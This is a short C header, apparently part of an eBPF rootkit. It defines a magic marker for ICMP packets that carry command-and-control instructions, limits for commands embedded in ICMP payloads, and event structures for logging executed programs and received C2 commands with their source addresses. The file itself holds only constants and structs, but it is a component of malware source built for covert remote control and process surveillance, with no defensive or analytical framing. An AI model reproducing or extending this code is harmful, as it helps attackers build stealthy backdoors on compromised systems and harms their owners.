#ifndef RK_BPF_COMMON_H
#define RK_BPF_COMMON_H

/* Magic pattern at start of ICMP payload to identify C2 packets */
#define RK_ICMP_MAGIC       0xDEAD1337
#define RK_ICMP_MAGIC_SIZE  4

/* Max command size embedded in ICMP payload (after magic) */
#define RK_ICMP_CMD_MAX     128

/* Ring buffer size for exec monitor events */
#define RK_RINGBUF_SIZE     (256 * 1024)

/* Max args to capture from execve */
#define RK_EXEC_ARGS_MAX    256
#define RK_EXEC_FNAME_MAX   256

/* Event structure for execution monitor */
struct exec_event {
    __u32 pid;
    __u32 uid;
    __u32 ppid;
    char  comm[16];
    char  filename[RK_EXEC_FNAME_MAX];
};

/* Event structure for ICMP C2 commands received */
struct icmp_cmd_event {
    __u32 src_ip;
    char  cmd[RK_ICMP_CMD_MAX];
};

#endif /* RK_BPF_COMMON_H */
